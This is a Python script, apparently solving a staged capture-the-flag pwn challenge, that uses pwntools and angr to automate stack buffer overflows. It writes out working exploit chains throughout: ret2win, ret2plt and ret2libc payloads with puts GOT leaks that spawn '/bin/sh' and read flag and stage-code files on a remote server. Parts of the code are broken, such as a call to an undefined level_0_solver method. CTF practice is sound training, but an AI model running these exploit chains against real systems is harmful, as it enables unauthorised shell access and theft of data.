from logging import getLogger, basicConfig
import os
import concurrent.futures
import time
from ctypes import CDLL

basicConfig(filename="/dev/null", level="INFO")  # otherwise pwntools and angr logging clash
import pwn
import angr

libc_ctype = CDLL("libc.so.6")

def submit_stage_code(comms_connection, code: str) -> bool:
    comms_connection.clean()
    comms_connection.sendline(code.encode())
    if b"Loading" in comms_connection.recvline_contains(b"Loading", timeout=1):
        pwn.log.info("Successfully submitted stage code")
        return True
    pwn.log.info("Failed to submit stage code")
    return False


def submit_win(comms_connection, code: str) -> bool:
    comms_connection.clean()
    comms_connection.sendline(code.encode())
    comms_connection.recvuntil(b"Here's the final flag: ", timeout=2)
    flag = comms_connection.recvline().decode().strip()
    if flag.startswith("cueh"):
        pwn.log.success(f"Obtained the final flag: {flag}")
        return True
    pwn.log.info("Failed to obtain flag")
    return False


def check_mem_corruption(simgr):
    if len(simgr.unconstrained):
        for path in simgr.unconstrained:
            if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCCCCCC"]):
                path.add_constraints(path.regs.pc == b"CCCCCCCC")
                if path.satisfiable():
                    simgr.stashes['memory_corruption'].append(path)
                simgr.stashes['unconstrained'].remove(path)
                simgr.drop(stash='active')
    return simgr


def find_offset(binary_name: str) -> tuple:
    # create angr project
    project = angr.Project(binary_name)
    state = project.factory.entry_state()

    class ReplacementSrand(angr.SimProcedure):
        def run(self, seed):
            libc_ctype.srand(seed)

    class ReplacementRand(angr.SimProcedure):
        def run(self, seed):
            return libc_ctype.rand()

    sim = project.factory.simgr(state, save_unconstrained=True)
    # create a stash to store states with memory corruption
    sim.stashes['memory_corruption'] = []

    # call check_mem_corruption() on each step
    sim.explore(step_func=check_mem_corruption)

    if len(sim.memory_corruption) > 0:
        solution_state = sim.memory_corruption[0]
        payload = solution_state.posix.dumps(0)
        offset = payload.decode().find('CCCCCCCC')
        valid_payload_offset = payload.split(b'CCCCCCCC')[0]
        # pwn.log.info(f"Crashed the program with payload: {payload}")
        # pwn.log.info(f"Offset: {offset}")
        return True, valid_payload_offset
    else:
        return False, b""
        raise Exception(f'[!] Could not find the solution for {binary_name}')


class LevelZeroSolver:
    """
    Simply need to crash the program. The binary will call the win function for us.
    This is more of a test of "do you understand the basic premise of the challenge"
    """

    def __init__(self, host, chall_port, binary_dir: str, flag_path, comms):
        self.stage_codes = []
        self.binary_dir = os.path.join(binary_dir, "level_0")
        self.flag_path = flag_path
        self.host = host
        self.port = chall_port
        self.comms_connection = comms

    def solve_level(self, challenge_binary: str) -> bool:
        """
        So, the challenge actually drops a shell for us if we overflow the buffer and the binary will call the win function for us.
        """
        elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)

        with pwn.process([elf.path], level="CRITICAL") as p:

            p.recvline()
            p.sendline(pwn.cyclic(0x100))
            pwn.sleep(1)
            p.clean()
            p.sendline(b"cat flag.txt")
            result = p.clean()
            if len(result) < 1:
                return False

        with pwn.remote(self.host, self.port, level="CRITICAL") as p:
            p.recvline()
            p.sendline(pwn.cyclic(0x100))
            pwn.sleep(1)
            p.clean()
            p.sendline(b"cat stage_code")
            result = p.clean()
            if len(result) < 1:
                return False

        if not submit_stage_code(self.comms_connection, result.decode()):
            return False

        self.stage_codes.append(result.decode())
        return True


class LevelOneSolver:
    """
    Ret2Win with pwntools
    """

    def __init__(self, host, chall_port, binary_dir: str, flag_path, comms):
        self.stage_codes = []
        self.binary_dir = os.path.join(binary_dir, "level_1")
        self.flag_path = flag_path
        self.host = host
        self.port = chall_port
        self.comms_connection = comms

    def solve_level(self, challenge_binary: str) -> bool:
        elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)

        with pwn.process([elf.path], level="CRITICAL") as p:

            p.clean()
            p.sendline(pwn.cyclic(400))

            if p.poll(True) == -11:
                corefile = p.corefile
                pattern = corefile.read(corefile.rsp, 4)
                offset = pwn.cyclic_find(pattern)
                pwn.log.debug(f"Found offset: {offset}")
                os.remove(corefile.path)
            else:
                pwn.log.warning(f"Could not crash program: {elf.path}")
                return False

        with pwn.process([elf.path], level="CRITICAL") as p:
            rop = pwn.ROP(elf)
            rop.raw(rop.find_gadget(["ret"]).address)
            rop.call(elf.sym.win)
            payload = pwn.flat({
                offset: rop.chain()
            })

            pwn.log.debug(f"Sending payload: {rop.dump()}")

            p.sendline(payload)
            pwn.sleep(1)
            p.clean()
            p.sendline(b"cat flag.txt")
            result = p.clean()
            if len(result) < 1:
                return False

        with pwn.remote(self.host, self.port, level="CRITICAL") as p:
            p.clean()
            p.sendline(payload)
            pwn.sleep(1)
            p.clean()
            p.sendline(b"cat stage_code")
            result = p.clean()
            if len(result) < 1:
                return False

        if not submit_stage_code(self.comms_connection, result.decode()):
            return False

        self.stage_codes.append(result.decode())
        return True


class LevelTwoSolver:
    """
    Essentially just automating a ret2plt. No need for libc leaks etc. This can still be done entirely with pwntools
    """

    def __init__(self, host, chall_port, binary_dir: str, flag_path, comms):
        self.stage_codes = []
        self.binary_dir = os.path.join(binary_dir, "level_2")
        self.flag_path = flag_path
        self.host = host
        self.port = chall_port
        self.comms_connection = comms

    def solve_level(self, challenge_binary: str) -> bool:
        elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)

        with pwn.process([elf.path], level="CRITICAL") as p:

            p.clean()
            p.sendline(pwn.cyclic(400))

            if p.poll(True) == -11:
                corefile = p.corefile
                pattern = corefile.read(corefile.rsp, 4)
                offset = pwn.cyclic_find(pattern)
                pwn.log.debug(f"Found offset: {offset}")
                os.remove(corefile.path)
            else:
                pwn.log.warning(f"Could not crash program: {elf.path}")
                return False

        with pwn.process([elf.path], level="CRITICAL") as p:
            rop = pwn.ROP(elf)
            rop.raw(rop.find_gadget(["ret"]).address)
            rop.call(elf.plt.system, [next(elf.search(b"/bin/sh\x00"))])
            payload = pwn.flat({
                offset: rop.chain()
            })

            pwn.log.debug(f"Sending payload: {rop.dump()}")

            p.sendline(payload)
            pwn.sleep(1)
            p.clean()
            p.sendline(b"cat flag.txt")
            result = p.clean()
            if len(result) < 1:
                return False

        with pwn.remote(self.host, self.port, level="CRITICAL") as p:
            p.clean()
            p.sendline(payload)
            pwn.sleep(1)
            p.clean()
            p.sendline(b"cat stage_code")
            result = p.clean()
            if len(result) < 1:
                return False

        if not submit_stage_code(self.comms_connection, result.decode()):
            return False

        self.stage_codes.append(result.decode())
        return True


class LevelThreeSolver:
    """
    Essentially just automating a ret2plt. No need for libc leaks etc. This can still be done entirely with pwntools
    """

    def __init__(self, host, chall_port, binary_dir: str, flag_path, comms):
        self.payload1 = None
        self.payload2 = None
        self.stage_codes = []
        self.binary_dir = os.path.join(binary_dir, "level_3")
        self.flag_path = flag_path
        self.host = host
        self.port = chall_port
        self.comms_connection = comms
        self.libc_remote = "libc-2.31.so"
        self.libc_local = "/lib/x86_64-linux-gnu/libc.so.6"
        self.offset = None
        self.max_attempts = 3

    def get_shell(self, challenge_binary: str, target: str) -> bool:
        elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)
        if target == "local":
            libc = pwn.ELF(self.libc_local, checksec=False)
        elif target == "remote":
            libc = pwn.ELF(self.libc_remote, checksec=False)
        else:
            pwn.log.error("Invalid target")
            return False
        if target == "local":
            with pwn.process([elf.path], level="CRITICAL") as proc:
                proc.clean()
                proc.sendline(pwn.cyclic(400))

                if proc.poll(True) == -11:
                    corefile = proc.corefile
                    pattern = corefile.read(corefile.rsp, 4)
                    self.offset = pwn.cyclic_find(pattern)
                    pwn.log.debug(f"Found offset: {self.offset}")
                    os.remove(corefile.path)
                else:
                    pwn.log.warning(f"Could not crash program: {elf.path}")
            p = pwn.process([elf.path], level="CRITICAL")
        elif target == "remote":
            if not self.payload1 or not self.payload2:
                pwn.log.error("Cannot run against remote without a payload!")
                return False
            p = pwn.remote(self.host, self.port, level="CRITICAL")

        rop1 = pwn.ROP(elf)
        rop1.puts(elf.got.puts)
        rop1.call(elf.sym.main)

        self.payload1 = pwn.flat({
            self.offset: rop1.chain()
        })
        p.clean()
        p.sendline(self.payload1)
        leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
        pwn.log.info(f"Leaked puts: {hex(leak)}")
        libc.address = leak - libc.sym.puts

        pwn.log.info(f"Libc base: {hex(libc.address)}")

        rop2 = pwn.ROP(libc)
        rop2.raw(rop2.find_gadget(["ret"]).address)
        rop2.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])
        self.payload2 = pwn.flat({
            self.offset: rop2.chain()
        })

        pwn.log.debug(f"Sending payload: {rop2.dump()}")
        p.clean()
        p.sendline(self.payload2)
        pwn.sleep(1)
        p.clean()
        if target == "local":
            p.sendline(b"cat flag.txt")
            result = p.clean()
            if len(result) < 1:
                pwn.log.debug("Could not get flag")
                return False
        elif target == "remote":
            p.sendline(b"cat stage_code")
            result = p.clean()
            if len(result) < 1:
                pwn.log.debug("Could not get stage code")
                return False
        p.close()
        return result

    def solve_level(self, challenge_binary: str) -> bool:
        # attempt 3 times locally
        for attempt in range(self.max_attempts):
            result = self.get_shell(challenge_binary, "local")
            if not result:
                continue
            result = self.get_shell(challenge_binary, "remote")
            if not result:
                continue
            break
        if not result:
            pwn.log.critical("Could not solve a level 3 locally in 3 attempts. Giving up.")
            return False

        # submit the stage code
        if not submit_stage_code(self.comms_connection, result.decode()):
            return False

        self.stage_codes.append(result.decode())
        return True


class LevelFourSolver:
    def __init__(self, host, chall_port, binary_dir: str, flag_path, comms):
        self.payload1 = None
        self.payload2 = None
        self.stage_codes = []
        self.binary_dir = os.path.join(binary_dir, "level_4")
        self.flag_path = flag_path
        self.host = host
        self.port = chall_port
        self.comms_connection = comms
        self.libc_remote = pwn.ELF("libc-2.31.so", checksec=False)
        self.libc_local = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        self.offset = None
        self.max_attempts = 3

    def get_shell(self, challenge_binary: str, target: str) -> bool:
        elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)
        if target == "local":
            self.offset = None
            p = pwn.process([elf.path], level="CRITICAL")
            libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
            solved, self.offset = find_offset(elf.path)
            if not solved:
                pwn.log.critical(f"Could not find memory corruption on level {challenge_binary}")
                return False
            else:
                pwn.log.success(f"Found memory corruption at offset: {len(self.offset)}")
        elif target == "remote":
            p = pwn.remote(self.host, self.port, level="CRITICAL")
            libc = pwn.ELF("libc-2.31.so", checksec=False)

        rop = pwn.ROP(elf)
        rop.puts(elf.got.puts)
        rop.call("main")
        pwn.log.debug(rop.dump())

        payload1 = self.offset + rop.chain()

        p.clean()
        p.sendline(payload1)
        p.recvline()
        leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
        pwn.log.info(f"Leaked puts: {hex(leak)}")
        libc.address = leak - libc.sym.puts
        pwn.log.info(f"Libc base: {hex(libc.address)}")

        rop2 = pwn.ROP(libc)
        rop2.raw(rop2.find_gadget(["ret"]).address)
        rop2.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])

        payload2 = self.offset + rop2.chain()
        pwn.log.debug(f"Sending payload: {rop2.dump()}")

        p.sendline(payload2)
        p.clean()
        if target == "local":
            p.sendline(b"cat flag.txt")
            result = p.clean()
            if len(result) < 1:
                pwn.log.debug("Could not get flag")
                return False
        elif target == "remote":
            p.sendline(b"cat stage_code")
            result = p.clean()
            if len(result) < 1:
                pwn.log.debug("Could not get stage code")
                return False
            libc.address = 0  # otherwise we will subtract huge numbers after the first binary
        p.close()
        return result

    def solve_level(self, challenge_binary: str) -> bool:
        # attempt 3 times
        for attempt in range(self.max_attempts):
            result = self.get_shell(challenge_binary, "local")
            if not result:
                continue
            result = self.get_shell(challenge_binary, "remote")
            if not result:
                continue
            break
        if not result:
            pwn.log.critical("Could not solve a level 3 locally in 3 attempts. Giving up.")
            return False

        # submit the stage code
        if "level_4/level_4" in challenge_binary:
            if not submit_win(self.comms_connection, result.decode()):
                return False

        elif not submit_stage_code(self.comms_connection, result.decode()):
            return False

        self.stage_codes.append(result.decode())
        return True


class ChallengeSolver:
    def __init__(self, host: str, chall_port: int, comms_port, local_flag_path: str, binaries_path: str, stage_code_storage_path: str):
        self.host = host
        self.chall_port = chall_port
        self.comms_port = comms_port
        self.stage_name = None
        self.local_flag_path = local_flag_path
        self.binaries_path = binaries_path
        self.stage_code_storage_path = stage_code_storage_path
        self.stage_codes = {
            "level_0": [],
            "level_1": [],
            "level_2": [],
            "level_3": [],
            "level_4": [],
        }

        self.comms_connection = pwn.remote(self.host, self.comms_port)

    def solve_stage(self, stage_name: str) -> bool:
        if stage_name not in self.stage_codes:
            raise Exception(f"Invalid stage name '{stage_name}'")
        self.stage_name = stage_name
        challenges = [os.path.join(
            self.binaries_path, self.stage_name, i) for i in sorted(os.listdir(os.path.join(self.binaries_path, self.stage_name)))]
        solved_local = self.level_0_solver(challenges[0], local=True)
        if not solved_local:
            return False
        solved_remote = self.level_0_solver(challenges[0], local=False)
        if solved_remote:
            return True
